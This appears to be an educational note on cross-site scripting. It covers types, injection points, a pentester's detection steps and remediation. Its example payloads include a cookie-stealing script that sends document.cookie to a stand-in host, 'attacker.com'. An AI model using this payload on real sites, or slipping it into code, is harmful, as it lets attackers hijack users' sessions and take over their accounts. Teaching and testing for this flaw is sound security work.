# Cross-Site Scripting (XSS)

---

## 📌 Description

Cross-Site Scripting (XSS) is a client-side vulnerability that allows an attacker to inject malicious scripts into web pages viewed by other users.

These scripts execute in the victim's browser and can manipulate the page, steal data, or perform actions on behalf of the user.

---

## ⚙️ Types of XSS

### 1. Reflected XSS

* Payload is reflected immediately in the response
* Delivered via URL or input field

### 2. Stored XSS

* Payload is stored in the server (e.g., database)
* Executes whenever users load the page

### 3. DOM-Based XSS

* Happens entirely in the browser
* JavaScript modifies the DOM using unsafe input

---

## 🔬 How It Works (Technical)

When user input is not properly sanitized or encoded, it gets executed as JavaScript in the browser.

Example:

```id="v3c9gl"
<script>alert('XSS')</script>
```

The browser treats this as executable code instead of text.

---

## 📍 Common Injection Points

* Search bars
* Comment sections
* URL parameters
* Form inputs
* HTTP headers (e.g., User-Agent)

---

## 💣 Example Payloads

### Basic Alert

```id="yr0sbq"
<script>alert(1)</script>
```

### Cookie Stealing

```id="37e2c1"
<script>fetch('https://attacker.com?c='+document.cookie)</script>
```

### HTML Injection

```id="f1u6eq"
<img src=x onerror=alert(1)>
```

---

## 🌍 Real-World Impact

* Session hijacking
* Credential theft
* Account takeover
* Defacement of websites

Example:

* XSS vulnerabilities have been found in major platforms like Google and Facebook in the past.

---

## 🔎 Detection Methodology (Pentester Approach)

1. Identify input fields
2. Inject simple payload:

   ```id="o9l8d2"
   <script>alert(1)</script>
   ```
3. Observe response:

   * Is input reflected?
   * Is it encoded or executed?
4. Try bypass techniques:

   * Event handlers (`onerror`, `onload`)
   * Different tags (`svg`, `img`)
5. Test different contexts:

   * HTML
   * JavaScript
   * Attributes

---

## 🛡️ Remediation

* Use output encoding (HTML, JS, URL encoding)
* Implement Content Security Policy (CSP)
* Validate and sanitize user input
* Use secure frameworks that auto-escape output

---

## 🧠 Key Takeaway

XSS is dangerous because it executes in the user's browser, making it possible to steal sensitive data or perform actions without user consent.
